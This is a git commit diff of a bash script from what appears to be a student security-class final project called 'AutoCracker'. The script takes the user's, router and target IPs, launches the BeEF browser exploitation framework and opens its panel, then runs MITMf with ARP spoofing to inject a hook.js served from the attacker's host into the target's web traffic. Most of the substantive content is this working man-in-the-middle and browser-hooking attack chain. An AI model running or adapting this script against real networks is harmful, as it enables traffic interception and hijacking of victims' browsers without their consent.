19eb4a7c1fa3c784510d8a735a3c7f82e4e7e571
root <root@localhost.localdomain>
2017-05-07 16:30:54 -0400

    yay args!"

--- cracker.sh
+++ cracker.sh
@@ -1,86 +1,27 @@
-#!/bin/bash
-printf "%q\n" "                                                                                             "     
-printf "%q\n" "                                                                                             "     
-printf "%q\n" "                                                                         ^^.....-+.         "     
-printf "%q\n" "                                                                   ^....^^.~-_+_         "     
-printf "%q\n" "                                                              ^...^.~-+==i=+_          "     
-printf "%q\n" "                                                         ^...^.-+===+-.             "     
-printf "%q\n" "                                                    ^..^  .-+ii=+-^                    "     
-printf "%q\n" "                                               ^^.^.-+=ii=~                         "     
-printf "%q\n" "                                          ^^^^._+iii=_.                             "     
-printf "%q\n" "                                     ^^^^  ^-+iii+-^                                  "     
-printf "%q\n" "                                ...^     ._=ii+-^                                      "     
-printf "%q\n" "                            ...^      -=ii=~                                         "     
-printf "%q\n" "                        .~~^        _=ii+-^                                             "     
-printf "%q\n" "                     .~~^       ^~+=+-^                                                "     
-printf "%q\n" "                   .~.^^-+=+_-=o*+-                                                   "     
-printf "%q\n" "                ^~~^^-i!!e***!!e***_                                                    "     
-printf "%q\n" "              .-~.^^^^^^~o*=~^  ~oi                                                    "     
-printf "%q\n" "            .-~...o!!o+o.                                                                  "     
-printf "%q\n" "          --~~.~oei_.          ooooo                                                     "     
-printf "%q\n" "          _---~~o+~           oooooooo                                                    "      
-printf "%q\n" "         _-                  ooooooooooo                                                  "                
-printf "%q\n" "          _++-               oooooooooooo                                                 "                 
-printf "%q\n" "         ._i+_-             oooooooooooo                                                 "                 
-printf "%q\n" "         +.~                 oooooooooooo                                                 "                 
-printf "%q\n" "          _=_-~..            oooooooooo                                                  "               
-printf "%q\n" "           _oi+-~.^^^^^^       oooooo                                                    "           
-printf "%q\n" "            ^+*o=_-~~.^^^          ^^                                                     "     
-printf "%q\n" "              ^ooi=_-~~^^     ^~~~_^                                                    "     
-printf "%q\n" "                 -=ooi=_-~.^^^^^^^^^..~                                                    "     
-printf "%q\n" "                   _iooi=+--~~..~~...^~_                                                  "     
-printf "%q\n" "                      ^_i**oi=_-----~~.^~-~^                                               "     
-printf "%q\n" "                         -+o**o==__--~~~..~--.                                           "     
-printf "%q\n" "                              ^-io**i=+_---~~~..-_-.                                      "      
-printf "%q\n" "                                   ^-+i*e*i=+_--~~..~-_-.                                  "      
-printf "%q\n" "                                       ._+o*ee*i++--~..~-__-.                             "      
-printf "%q\n" "                                             ^~=o*eeo==+_-~~~-_-.^                        "      
-printf "%q\n" "                                                  ._+o*ee*ii=+-~~--___-~^                 "      
-printf "%q\n" "                                                        ^-i**e**i==+-~~--____--~.^        "      
-printf "%q\n" "                                                             ^-i**ee*oi=++_----_o.       "      
-printf "%q\n" "                                                                   ._io*eeee*oii=oo        "      
-printf "%q\n" "                                                                          ^.~_+++.        "      
-
-echo "^"
-echo "|"
-echo "|_ Thats supposed to be a nutcracker:)"
-echo "000000000000000000000000000000000000000000000000000000000000000000000000000000	"
-echo "000 _____0000000000__0000000000000000000000000000000000000__000000000000000000"
+echo "000000000\/000000000000000000000000\/00000000000\/00000\/00000\/0000000\/00000"
 echo "000/  _  \  __ ___/  |_  ____   ________________    ____ |  | __ ___________ 0"
-echo "00/  /_\  \|  |  \   __\/  _ \_/ ___\_  __ \____\00/ ___\|  |/ // __ \_  __ \0  "
-echo "0/    |    \  |  /|  |0(  ( ) )  \___|  |0\//____\\  \___|    <  \ ___/ | | \/0 "
-echo "0\____|__  /____/0|__|00\____/ \___  >__|00(______/\_____>__|_ \ \___> | |0000  "
-echo "000000000\/000000000000000000000000\/00000000000\/00000\/00000\/0000000\/00000   "   								"																
+echo "00/  /_\  \|  |  \   __\/  _ \_/ ___\_  __ \____\00/ ___\|  |/ // __ \_  __ \0"
+echo "0/    |    \  |  /|  |0(  ( ) )  \___|  |0\//____\\  \___|    <  \ ___/ | | \/0"
+echo "0\____|__  /____/0|__|00\____/ \___  >__|00(______/\_____>__|_ \ \___> | |0000"
+echo "000000000\/000000000000000000000000\/00000000000\/00000\/00000\/0000000\/00000"											
 #working title:)/ ascii art title
-#PS thats a nut cracker
-				
-#working title:)
-#PS thats a nut cracker 								"																
-#working title:)
 
-
-#feel free to prettify any of this:)
-# This tool will...(help me out here folks :) )
-echo "CS378 AutoCracker CSRFF Final Project(AKA The Cracker)"
+echo "CS378 AutoCracker - Browser Hook and CSRFF Final Project"
 echo "By Dillon Cuthrell, Anthony Nguyen, Midora DuBose"
-echo "Type website here:"
 
-read s
+echo "Enter you IP here"
+read yours
+echo "Enter your router's IP here"
+read router
+echo "Enter target IP here"
+read target
 
-b=""
-if [ -n s  ] ;
+if [[ -n yours && -n target  ]] ;
 then
-#eval beef
-echo "you typed:"
-#"/n?"
-#start beef
-#eval $command
-#maybe$()?
-echo "$s"
+echo "Your IP is $yours, Router is $router, Target is $target"
 
 
-
-echo "beef"
+echo "Staring BeEF ... "
 cd /usr/share/beef-xss; ./beef > /root/Desktop/boutput.txt
 
 #parse obutput.txt
@@ -94,18 +35,15 @@ echo "$i"
 fi 
 done
 
+xvar="http://$yours:3000/ui/panel"
+xdg-open $xvar
+
 #here we would pass our site/target to mitmf
-mitmf --spoof --arp -i wlan0 --gateway 10.0.2.1 --target 10.0.2.236 --inject --js-url http://10.0.2.15:3000/hook.js > /root/Desktop/moutput.txt
+echo "Starting MITMf ... "
+mvar="mitmf --spoof --arp -i eth0 --gateway $router --target $target --inject --js-url http://$yours:3000/hook.js > /root/Desktop/moutput.txt"
+echo $mvar
+eval $mvar
 
-#possibly we parse the output of moutput.txt?
-
-#possibly some wgets?
-#wget
-#wget "http://127.0.0.1:3000/hook.js"
-#wget "http://www.google.com"
-#echo "end beef, hook downloaded"
-
-#XSS occurs here?
 
 fi
 
